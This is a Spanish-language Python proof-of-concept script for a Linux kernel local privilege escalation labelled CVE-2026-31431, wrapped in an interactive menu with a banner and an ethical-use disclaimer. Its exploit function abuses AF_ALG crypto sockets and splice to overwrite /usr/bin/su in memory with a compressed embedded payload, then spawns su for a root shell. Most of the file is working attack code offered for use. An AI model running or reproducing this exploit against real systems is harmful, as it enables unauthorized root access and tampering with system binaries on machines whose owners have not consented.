#!/usr/bin/env python3

ROSN-LR5  |  Kernel LPE PoC para CVE-2026-31431
Desarrollado sobre investigación original de copy.fail
"""
import os
import sys
import zlib
import socket
import termios
import tty
import time

# ------------------------------------------------------------
# Paleta de colores
# ------------------------------------------------------------
RST   = "\033[0m"
BOLD  = "\033[1m"
BLINK = "\033[5m"
WHITE = "\033[97m"
BLACK = "\033[30m"
RED   = "\033[91m"
GREEN = "\033[92m"
YELLOW= "\033[93m"
CYAN  = "\033[96m"
BG_BLACK  = "\033[40m"
BG_RED    = "\033[41m"
BG_GREEN  = "\033[42m"
BG_YELLOW = "\033[43m"
BG_BLUE   = "\033[44m"
BG_MAGENTA= "\033[45m"

# ------------------------------------------------------------
# Banner principal
# ------------------------------------------------------------
BANNER = f"""
{BOLD}{CYAN}
╔══════════════════════════════════════════════════════════╗
║   ██████╗  ██████╗ ███████╗███╗   ██╗      ██╗     ██████╗ ███████╗  ║
║   ██╔══██╗██╔═══██╗██╔════╝████╗  ██║      ██║     ██╔══██╗██╔════╝  ║
║   ██████╔╝██║   ██║███████╗██╔██╗ ██║█████╗██║     ██████╔╝███████╗  ║
║   ██╔══██╗██║   ██║╚════██║██║╚██╗██║╚════╝██║     ██╔══██╗╚════██║  ║
║   ██║  ██║╚██████╔╝███████║██║ ╚████║      ███████╗██║  ██║███████║  ║
║   ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═══╝      ╚══════╝╚═╝  ╚═╝╚══════╝  ║
╚══════════════════════════════════════════════════════════╝
{RST}{RED}       [ Kernel AF_ALG Exploit – Elevación local a root ]{RST}
"""

# ------------------------------------------------------------
# Disclaimer interactivo
# ------------------------------------------------------------
DISCLAIMER = f"""
{BG_BLACK}{WHITE}{'─'*65}
 Este script es una prueba de concepto de la vulnerabilidad
 CVE-2026-31431 y permite escalar privilegios a root en
 distribuciones Linux vulnerables.

 ⚠️  USO ÉTICO EXCLUSIVO: solo en entornos propios o
    autorizados para auditorías de seguridad.
    El autor no se responsabiliza por usos indebidos.

 Créditos investigación original : copy.fail
 Adaptación y automatización    : ROSNLR5
{'─'*65}{RST}

{BOLD}{BLINK}>>> Presioná cualquier tecla para continuar (ESC para salir) <<<{RST}
"""

# ------------------------------------------------------------
# Utilidad: leer tecla sin Enter
# ------------------------------------------------------------
def leer_tecla():
    fd = sys.stdin.fileno()
    config_original = termios.tcgetattr(fd)
    try:
        tty.setraw(fd)
        char = sys.stdin.read(1)
        if char == '\x1b':
            # Podría ser secuencia de escape (flechas)
            fd_no_bloqueo = os.fcntl(fd, os.F_GETFL)
            os.fcntl(fd, os.F_SETFL, fd_no_bloqueo | os.O_NONBLOCK)
            extra = sys.stdin.read(2)
            os.fcntl(fd, os.F_SETFL, fd_no_bloqueo)
            if len(extra) == 2:
                return char + extra
            else:
                return char
        return char
    finally:
        termios.tcsetattr(fd, termios.TCSADRAIN, config_original)

# ------------------------------------------------------------
# Auditoría de privilegios
# ------------------------------------------------------------
def auditoria_privilegios():
    os.system('clear')
    print(f"{BOLD}{YELLOW}[+] Recolectando información del usuario...{RST}")
    time.sleep(0.3)
    uid = os.getuid()
    usuario = os.getenv('USER', os.getenv('LOGNAME', 'desconocido'))
    grupos_ids = os.getgroups()
    print(f"    Usuario : {GREEN}{usuario}{RST}  (UID: {uid})")

    if uid == 0:
        print(f"    Estado  : {BG_GREEN}{BLACK} ★ ROOT ★ {RST}")
    else:
        print(f"    Estado  : {BG_YELLOW}{BLACK} Usuario estándar {RST}")

    try:
        import grp
        nombres_grupos = [grp.getgrgid(g).gr_name for g in grupos_ids]
        grupos_str = ', '.join(nombres_grupos)
    except Exception:
        grupos_str = 'no disponible'
    print(f"    Grupos  : {grupos_str}")

    # Chequeo extra de sudo/wheel
    if 'sudo' in grupos_str or 'wheel' in grupos_str:
        print(f"\n{BG_BLUE}{WHITE} → El usuario pertenece a un grupo administrativo. {RST}")
    else:
        print(f"\n{BG_MAGENTA}{WHITE} → Sin membresía en sudo/wheel. {RST}")

    input(f"\n{BOLD}Presioná Enter para volver al menú...{RST}")

# ------------------------------------------------------------
# Núcleo del exploit (investigación copy.fail)
# ------------------------------------------------------------
def ejecutar_exploit():
    os.system('clear')
    print(f"{BOLD}{RED}[!] Preparando inyección sobre AF_ALG...{RST}")
    time.sleep(0.5)

    def hex_a_bytes(hex_str):
        return bytes.fromhex(hex_str)

    def inyectar_payload(fd_su, offset, fragmento):
        sock = socket.socket(38, 5, 0)                     # AF_ALG, SOCK_SEQPACKET
        sock.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
        SOL_ALG = 279
        sock.setsockopt(SOL_ALG, 1, hex_a_bytes('0800010000000010' + '0' * 64))
        sock.setsockopt(SOL_ALG, 5, None, 4)
        client, _ = sock.accept()
        tam = offset + 4
        relleno = hex_a_bytes('00')
        client.sendmsg(
            [b"A" * 4 + fragmento],
            [(SOL_ALG, 3, relleno * 4),
             (SOL_ALG, 2, b'\x10' + relleno * 19),
             (SOL_ALG, 4, b'\x08' + relleno * 3)],
            32768
        )
        r, w = os.pipe()
        os.splice(fd_su, w, tam, offset_src=0)
        os.splice(r, client.fileno(), tam)
        try:
            client.recv(8 + tam)
        except Exception:
            pass

    try:
        fd_su = os.open("/usr/bin/su", os.O_RDONLY)
        payload_comprimido = hex_a_bytes(
            "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e"
            "07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979"
            "fac5190c0c0c0032c310d3"
        )
        payload = zlib.decompress(payload_comprimido)
        offset = 0
        while offset < len(payload):
            inyectar_payload(fd_su, offset, payload[offset:offset+4])
            offset += 4

        print(f"{BOLD}{GREEN}[+] Payload inyectado correctamente.{RST}")
        print(f"{BOLD}{CYAN}[+] Solicitando shell root...{RST}")
        time.sleep(0.8)
        os.system("su")
    except Exception as error:
        print(f"{RED}[-] Falló la ejecución: {error}{RST}")
        time.sleep(2)

# ------------------------------------------------------------
# Menú interactivo (navegable con flechas)
# ------------------------------------------------------------
def menu_principal():
    opciones = [
        "🔍 Auditar privilegios del usuario",
        "⚡ Ejecutar exploit ROOT (CVE-2026-31431)",
        "🚪 Salir"
    ]
    seleccion = 0

    while True:
        os.system('clear')
        print(BANNER)
        print(f"{BOLD}── Menú interactivo ──────────────────────────────{RST}\n")
        for idx, texto in enumerate(opciones):
            if idx == seleccion:
                print(f" {BG_BLUE}{WHITE} ▶ {texto:<46} {RST}")
            else:
                print(f"   {texto}")
        print(f"\n{BOLD}Usá ↑/↓ para moverte, ENTER para elegir, ESC para salir{RST}")

        tecla = leer_tecla()
        if tecla == '\x1b[A':      # Flecha arriba
            seleccion = (seleccion - 1) % len(opciones)
        elif tecla == '\x1b[B':    # Flecha abajo
            seleccion = (seleccion + 1) % len(opciones)
        elif tecla == '\r' or tecla == '\n':
            if seleccion == 0:
                auditoria_privilegios()
            elif seleccion == 1:
                ejecutar_exploit()
                break
            elif seleccion == 2:
                break
        elif tecla == '\x1b':      # ESC
            break

# ------------------------------------------------------------
# Punto de entrada
# ------------------------------------------------------------
def main():
    os.system('clear')
    print(BANNER)
    print(DISCLAIMER)

    tecla = leer_tecla()
    if tecla == '\x1b':
        print(f"\n{YELLOW}Saliendo sin ejecutar...{RST}")
        sys.exit()

    menu_principal()
    print(f"\n{CYAN}Consola finalizada. ¡Hasta luego!{RST}")

if __name__ == "__main__":
    main()
